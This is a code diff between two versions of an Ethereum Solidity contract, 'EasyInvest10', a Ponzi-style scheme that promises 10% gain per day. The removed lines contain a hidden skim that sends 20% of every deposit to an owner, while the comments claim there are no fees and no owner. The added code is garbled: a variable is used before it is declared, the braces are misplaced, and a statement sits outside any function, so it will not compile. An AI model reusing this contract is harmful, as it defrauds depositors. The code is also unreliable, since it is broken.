@@ -1,14 +1,13 @@
 /* 
- source code generate by Bui Dinh Ngoc aka ngocbd<buidinhngoc.aiti@gmail.com> for smartcontract EasyInvest10 at 0x0744a686c17480b457a4fbb743195bf2815ca2b8
+ source code generate by Bui Dinh Ngoc aka ngocbd<buidinhngoc.aiti@gmail.com> for smartcontract EasyInvest10 at 0x339150b0851bc5b3c0323789a58cc4e4afb38b37
 */
 pragma solidity ^0.4.24;
+
 /**
- *
- * Easy Investment 10% Contract
+ * Easy Investment Contract (Fork)
  *  - GAIN 10% PER 24 HOURS (every 5900 blocks)
- *  - NO COMMISSION on your investment (every ether stays on contract's balance)
- *  - NO FEES are collected by the owner, in fact, there is no owner at all (just look at the code)
- *
+
+
  * How to use:
  *  1. Send any amount of ether to make an investment
  *  2a. Claim your profit by sending 0 ether transaction (every day, every week, i don't care unless you're spending too much on GAS)
@@ -23,31 +22,30 @@ pragma solidity ^0.4.24;
  */
  
 contract EasyInvest10 {
-    address owner;
-
-    function EasyInvest10 () {
-        owner = msg.sender;
-    }
     // records amounts invested
-    mapping (address => uint256) invested;
+    mapping (address => uint256) public invested;
     // records blocks at which investments were made
-    mapping (address => uint256) atBlock;
+    mapping (address => uint256) public atBlock;
+	
+
     // this function called every time anyone sends a transaction to this contract
-    function() external payable {
-        owner.send(msg.value/5);
-         // if sender (aka YOU) is invested more than 0 ether
-        if (invested[msg.sender] != 0){
-         // calculate profit amount as such:   
-        address kashout = msg.sender;
-        // amount = (amount invested) * 10% * (blocks since last transaction) / 5900
-        // 5900 is an average block count per day produced by Ethereum blockchain
-        uint256 getout = invested[msg.sender]*10/100*(block.number-atBlock[msg.sender])/5900;
-        // send calculated amount of ether directly to sender (aka YOU)
-        kashout.send(getout);
-        }
+    function () external payable {
+        // if sender (aka YOU) is invested more than 0 ether
+        if (invested[msg.sender] != 0) {
+            // calculate profit amount as such:
+            // amount = (amount invested) * 10% * (blocks since last transaction) / 5900
+            // 5900 is an average block count per day produced by Ethereum blockchain
+            uint256 amount = invested[msg.sender] * 10 / 100 * (block.number - atBlock[msg.sender]) / 5900;
+
+            // send calculated amount of ether directly to sender (aka YOU)
+            msg.sender.transfer(amount);
+			invested[totalETH] += msg.value;
+		}
+			
+
         // record block number and invested amount (msg.value) of this transaction
         atBlock[msg.sender] = block.number;
-        invested[msg.sender] += msg.value;
-
-    }
-}
+        invested[msg.sender] += msg.value;}
+        address totalETH = msg.sender;
+        
+	}
